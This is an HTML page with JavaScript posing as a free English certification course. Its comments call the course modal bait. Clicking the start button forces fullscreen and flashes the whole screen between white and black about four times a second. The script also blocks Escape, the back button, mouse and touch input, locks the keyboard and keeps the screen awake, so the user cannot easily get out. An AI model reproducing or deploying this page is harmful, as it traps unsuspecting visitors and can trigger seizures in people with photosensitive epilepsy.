<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <!-- Google Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <!-- FontAwesome Icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        :root {
            --bg-color: #0b0b0f;
            --panel-bg: rgba(18, 18, 24, 0.75);
            --panel-border: rgba(255, 255, 255, 0.08);
            --accent-primary: #6366f1;
            --accent-secondary: #4f46e5;
            --accent-glow: rgba(99, 102, 241, 0.35);
            --text-primary: #f3f4f6;
            --text-secondary: #9ca3af;
            --text-muted: #6b7280;
            --success: #10b981;
            --danger: #ef4444;
            
            /* Dynamic active flashing colors */
            --on-color: #ffffff;
            --off-color: #000000;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Outfit', sans-serif;
            user-select: none;
        }

        body, html {
            width: 100%;
            height: 100%;
            overflow: hidden;
            background-color: var(--bg-color);
            color: var(--text-primary);
        }

        body.flashing {
            cursor: none !important;
        }
        body.flashing * {
            pointer-events: none !important;
        }

        /* Bait Modal Styles */
        #prank-modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1000;
            background: rgba(11, 11, 15, 0.95);
            display: flex;
            align-items: center;
            justify-content: center;
            transition: opacity 0.4s ease, visibility 0.4s ease;
        }

        #prank-modal.hidden {
            opacity: 0;
            visibility: hidden;
            pointer-events: none;
        }

        .modal-card {
            background: rgba(25, 25, 35, 0.85);
            backdrop-filter: blur(16px);
            -webkit-backdrop-filter: blur(16px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 24px;
            padding: 36px;
            max-width: 460px;
            width: 90%;
            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.6);
            text-align: center;
        }

        .modal-header {
            margin-bottom: 20px;
        }

        .modal-header i {
            font-size: 3rem;
            color: #6366f1;
            margin-bottom: 12px;
        }

        .modal-header h2 {
            font-size: 1.6rem;
            font-weight: 700;
            color: var(--text-primary);
        }

        .modal-card p {
            font-size: 0.95rem;
            color: var(--text-secondary);
            line-height: 1.6;
            margin-bottom: 24px;
        }

        .alert-box {
            background: rgba(99, 102, 241, 0.08);
            border: 1px solid rgba(99, 102, 241, 0.15);
            border-radius: 12px;
            padding: 14px;
            font-size: 0.85rem;
            color: var(--text-secondary);
            display: flex;
            align-items: flex-start;
            gap: 10px;
            text-align: left;
            margin-bottom: 28px;
            line-height: 1.5;
        }

        .alert-box i {
            color: #6366f1;
            font-size: 1.1rem;
            margin-top: 2px;
        }

        .alert-box kbd {
            background: rgba(255, 255, 255, 0.15);
            border: 1px solid rgba(255, 255, 255, 0.2);
            padding: 1px 6px;
            border-radius: 4px;
            font-family: monospace;
            color: var(--text-primary);
        }

        .btn-start-course {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            width: 100%;
            background: linear-gradient(135deg, #6366f1 0%, #4f46e5 100%);
            border: none;
            border-radius: 14px;
            padding: 16px;
            color: white;
            font-size: 1.05rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(99, 102, 241, 0.3);
        }

        .btn-start-course:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(99, 102, 241, 0.45);
            filter: brightness(1.1);
        }

        /* The full-screen canvas/background that flashes */
        #flash-screen {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
            background-color: var(--off-color);
            transition: background-color 0.05s ease-out;
        }

    </style>
</head>
<body>

    <!-- Bait landing modal for course session activation -->
    <div id="prank-modal">
        <div class="modal-card">
            <div class="modal-header">
                <i class="fa-solid fa-graduation-cap"></i>
                <h2>Free English Certification Course</h2>
            </div>
            <p>Welcome to your interactive English listening and grammar session. Please start the course to begin.</p>
            <button id="start-course-btn" class="btn-start-course">
                <i class="fa-solid fa-play"></i>
                <span>Start Course Session</span>
            </button>
        </div>
    </div>

    <!-- Flashing Canvas -->
    <div id="flash-screen"></div>

    <script>
        // --- State Management ---
        const state = {
            isFlashing: false,
            isOn: false,
            interval: 250,      // Total cycle duration in ms
            dutyCycle: 50,      // Percentage of time spent in the "ON" state
            onColor: '#ffffff',
            offColor: '#000000',
            useWakeLock: true,
            isFullscreen: false
        };

        // --- DOM Elements ---
        const elFlashScreen = document.getElementById('flash-screen');

        // --- Wake Lock Variable ---
        let wakeLock = null;

        // --- Loop Variables ---
        let loopTimeout = null;



        // --- Event Listeners Initialization ---
        function initEvents() {
            // Initialize CSS custom properties
            document.documentElement.style.setProperty('--on-color', state.onColor);
            document.documentElement.style.setProperty('--off-color', state.offColor);

            // Fullscreen status event listeners
            document.addEventListener('fullscreenchange', handleFullscreenChange);
            document.addEventListener('webkitfullscreenchange', handleFullscreenChange);

            // Keyboard Shortcuts (Capture Phase)
            const blockEscape = (e) => {
                if (e.key === 'Escape' || e.key === 'Backspace') {
                    e.preventDefault();
                    e.stopPropagation();
                    
                    // If Escape is pressed, aggressively re-enter fullscreen if flashing
                    if (state.isFlashing) {
                        attemptFullscreen();
                    }
                }
            };
            document.addEventListener('keydown', (e) => {
                if (e.key === 'Escape' || e.key === 'Backspace') {
                    blockEscape(e);
                    return;
                }

                // If currently flashing, block all other keyboard keys except P
                if (state.isFlashing) {
                    if (e.key === 'p' || e.key === 'P') {
                        e.preventDefault();
                        e.stopPropagation();
                        stopFlashing();
                        window.close(); // Try to close the tab directly
                    } else {
                        e.preventDefault();
                        e.stopPropagation();
                    }
                    return;
                }

                // Normal keyboard handling when flashing is paused
                if (e.key === 'p' || e.key === 'P') {
                    e.preventDefault();
                    startFlashing();
                } else if (e.key === 'f' || e.key === 'F') {
                    e.preventDefault();
                    toggleFullscreen();
                }
            }, true);

            // Block Escape keyup and keypress as well
            document.addEventListener('keyup', blockEscape, true);
            document.addEventListener('keypress', blockEscape, true);

            // Block all mouse/touch interactions during active flashing (touch off)
            const blockInteractions = (e) => {
                if (state.isFlashing) {
                    e.preventDefault();
                    e.stopPropagation();
                }
            };
            window.addEventListener('click', blockInteractions, true);
            window.addEventListener('mousedown', blockInteractions, true);
            window.addEventListener('mouseup', blockInteractions, true);
            window.addEventListener('contextmenu', blockInteractions, true);

            // Block touch events on mobile devices
            window.addEventListener('touchstart', blockInteractions, { capture: true, passive: false });
            window.addEventListener('touchmove', blockInteractions, { capture: true, passive: false });
            window.addEventListener('touchend', blockInteractions, { capture: true, passive: false });
            window.addEventListener('touchcancel', blockInteractions, { capture: true, passive: false });

            // Push initial state and listen to popstate to intercept back button
            window.history.pushState(null, "", window.location.href);
            window.addEventListener('popstate', () => {
                if (state.isFlashing) {
                    window.history.pushState(null, "", window.location.href);
                }
            });
        }

        // --- Fullscreen Handling ---
        function toggleFullscreen() {
            if (!document.fullscreenElement) {
                document.documentElement.requestFullscreen()
                    .catch(err => {
                        console.warn(`Failed to enter fullscreen: ${err.message}`);
                    });
            } else {
                document.exitFullscreen();
            }
        }

        function handleFullscreenChange() {
            state.isFullscreen = !!document.fullscreenElement;
            if (!state.isFullscreen && state.isFlashing) {
                attemptFullscreen();
            }
        }

        function attemptFullscreen() {
            if (state.isFlashing && !document.fullscreenElement) {
                document.documentElement.requestFullscreen()
                    .then(() => {
                        state.isFullscreen = true;
                        lockKeyboard();
                    })
                    .catch(() => {
                        // Force fullscreen back on any user interaction/movement
                        const forceFS = () => {
                            if (state.isFlashing && !document.fullscreenElement) {
                                document.documentElement.requestFullscreen()
                                    .then(() => {
                                        state.isFullscreen = true;
                                        lockKeyboard();
                                        removeFSListeners();
                                    })
                                    .catch(() => {});
                            }
                        };
                        const removeFSListeners = () => {
                            window.removeEventListener('click', forceFS, true);
                            window.removeEventListener('touchstart', forceFS, true);
                            window.removeEventListener('keydown', forceFS, true);
                            window.removeEventListener('mousemove', forceFS, true);
                        };
                        window.addEventListener('click', forceFS, true);
                        window.addEventListener('touchstart', forceFS, true);
                        window.addEventListener('keydown', forceFS, true);
                        window.addEventListener('mousemove', forceFS, true);
                    });
            }
        }

        async function lockKeyboard() {
            if (navigator.keyboard && typeof navigator.keyboard.lock === 'function') {
                try {
                    await navigator.keyboard.lock(["Escape"]);
                    console.log("Escape key locked successfully");
                } catch (err) {
                    console.warn(`Keyboard Lock failed: ${err.message}`);
                }
            }
        }

        function unlockKeyboard() {
            if (navigator.keyboard && typeof navigator.keyboard.unlock === 'function') {
                navigator.keyboard.unlock();
                console.log("Keyboard unlocked");
            }
        }

        function startFlashing() {
            state.isFlashing = true;
            state.isOn = false;

            // Push history state to intercept back button on mobile/browsers
            window.history.pushState(null, "", window.location.href);
            
            // Add flashing class to body (hides cursor, blocks pointer-events)
            document.body.classList.add('flashing');

            // Attempt to enter Fullscreen if not already
            if (!state.isFullscreen) {
                document.documentElement.requestFullscreen()
                    .then(() => {
                        state.isFullscreen = true;
                        lockKeyboard();
                    })
                    .catch(() => {});
            } else {
                lockKeyboard();
            }

            // Request Wake Lock if checked
            if (state.useWakeLock) {
                requestWakeLock();
            }

            // Start the flashing loop
            runLoop();
        }

        function stopFlashing() {
            state.isFlashing = false;
            clearTimeout(loopTimeout);
            
            // Remove flashing class from body (restores cursor)
            document.body.classList.remove('flashing');
            
            // Unlock keyboard
            unlockKeyboard();
            
            // Reset background color to OFF state
            elFlashScreen.style.backgroundColor = state.offColor;
            
            // Release Wake Lock
            releaseWakeLock();

            console.log('Screen flashing stopped.');
        }

        // Precise dynamic timing loop based on current interval and duty cycle
        function runLoop() {
            if (!state.isFlashing) return;

            // Toggle state
            state.isOn = !state.isOn;
            elFlashScreen.style.backgroundColor = state.isOn ? state.onColor : state.offColor;

            // Calculate timing based on duty cycle
            // dutyCycle: % time spent ON.
            const onTime = Math.max(10, Math.round(state.interval * (state.dutyCycle / 100)));
            const offTime = Math.max(10, Math.round(state.interval * (1 - state.dutyCycle / 100)));
            
            const nextDuration = state.isOn ? onTime : offTime;

            loopTimeout = setTimeout(runLoop, nextDuration);
        }

        // --- Screen Wake Lock API ---
        async function requestWakeLock() {
            if (!('wakeLock' in navigator) || !state.useWakeLock) return;
            try {
                wakeLock = await navigator.wakeLock.request('screen');
            } catch (err) {
                console.warn(`Wake Lock request failed: ${err.message}`);
            }
        }

        function releaseWakeLock() {
            if (wakeLock) {
                wakeLock.release().then(() => {
                    wakeLock = null;
                });
            }
        }

        // Re-acquire Wake Lock when window returns to focus
        document.addEventListener('visibilitychange', async () => {
            if (wakeLock !== null && document.visibilityState === 'visible' && state.isFlashing && state.useWakeLock) {
                await requestWakeLock();
            }
        });

        // Start
        initEvents();

        // Bait landing modal initialization
        const elStartCourseBtn = document.getElementById('start-course-btn');
        const elPrankModal = document.getElementById('prank-modal');

        elStartCourseBtn.addEventListener('click', () => {
            // Hide modal
            elPrankModal.classList.add('hidden');
            
            // Enter Fullscreen (valid gesture context)
            if (!document.fullscreenElement) {
                document.documentElement.requestFullscreen()
                    .then(() => {
                        state.isFullscreen = true;
                    })
                    .catch((err) => {
                        console.warn(`Fullscreen error: ${err.message}`);
                    })
                    .finally(() => {
                        // Start the flashing loop
                        startFlashing();
                    });
            } else {
                startFlashing();
            }
        });
    </script>
</body>
